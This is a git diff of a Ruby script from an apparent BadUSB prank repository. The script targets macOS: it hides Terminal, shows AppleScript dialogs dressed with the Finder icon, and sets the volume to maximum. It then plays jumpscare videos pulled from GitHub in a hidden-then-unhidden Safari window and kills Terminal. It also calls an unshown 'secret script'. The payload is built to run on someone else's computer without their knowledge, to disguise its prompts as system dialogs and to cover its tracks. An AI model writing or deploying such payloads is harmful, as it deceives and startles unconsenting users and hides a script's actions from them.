@@ -7,7 +7,6 @@ system("osascript -e 'tell application \"Terminal\" to set visible of front wind
 
 # --- Helper: Display Dialog with Finder Icon via AppleScript ---
 def display_dialog(message, buttons, default)
-  # Construct the AppleScript command using the Finder icon.
   button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
   ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
   output = `osascript -e '#{ascript}'`
@@ -78,19 +77,19 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Trigger a Jumpscare in Safari ---
-# Opens the temporary HTML file in Safari, hides the window initially, waits, then unhides it.
+# Opens Safari to display the jumpscare video using a temporary HTML file.
 def trigger_jumpscare(video_url)
   set_volume_to_max
   html_file = create_jumpscare_html(video_url)
-  # Open Safari with the temporary HTML file.
+  # Open the HTML file in Safari.
   system("open -a Safari '#{html_file}'")
   # Immediately hide Safari's front window.
   system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-  # Wait briefly to allow sound to start.
+  # Wait briefly (allowing the sound to start).
   sleep 0.5
-  # Unhide Safari so the jumpscare becomes visible.
+  # Unhide Safari so the jumpscare is visible.
   system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
-  # Allow the jumpscare to play for 1 second.
+  # Let the jumpscare play for 1 second.
   sleep 1
 end
 
@@ -100,12 +99,11 @@ def run_secret_script
 end
 
 # --- Subscriber Branch Action ---
-# If "Hawk" is chosen, run the secret script; if "Tuah" is chosen, trigger the winner jumpscare.
+# For subscribed users: if "Hawk" is chosen, run the secret script; if "Tuah" is chosen, trigger jumpscare.
 def subscriber_action(choice)
   if choice.downcase == "hawk"
     run_secret_script
   elsif choice.downcase == "tuah"
-    # Trigger winner jumpscare using the raw link for Jeff_Jumpscare.mp4.
     trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
   else
     puts "Unexpected button choice."
@@ -123,14 +121,25 @@ if subscribed.nil?
 end
 
 if subscribed.downcase == "no"
-  # Non-subscriber branch: Use the raw link for jumpscare2.mp4.
+  # Non-subscriber branch: show a new prompt with two button options.
   sleep 1
-  non_sub_video = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
-  trigger_jumpscare(non_sub_video)
+  non_sub_choice = display_dialog("Choose your jumpscare:", ["Default", "Sydney lover"], "Default")
+  if non_sub_choice.nil?
+    puts "No choice made. Exiting."
+    exit 0
+  elsif non_sub_choice.downcase == "default"
+    video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
+  elsif non_sub_choice.downcase == "sydney lover"
+    video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4"
+  else
+    puts "Unexpected option. Exiting."
+    exit 0
+  end
+  trigger_jumpscare(video_url)
   system("killall Terminal")
   exit 0
 else
-  # Subscriber branch: Show a dialog with two buttons: "Hawk" and "Tuah"
+  # Subscriber branch: show a dialog with two buttons: "Hawk" and "Tuah"
   button_choice = display_dialog("Choose a button:", ["Hawk", "Tuah"], "Hawk")
   if button_choice.nil?
     puts "No button chosen. Exiting."
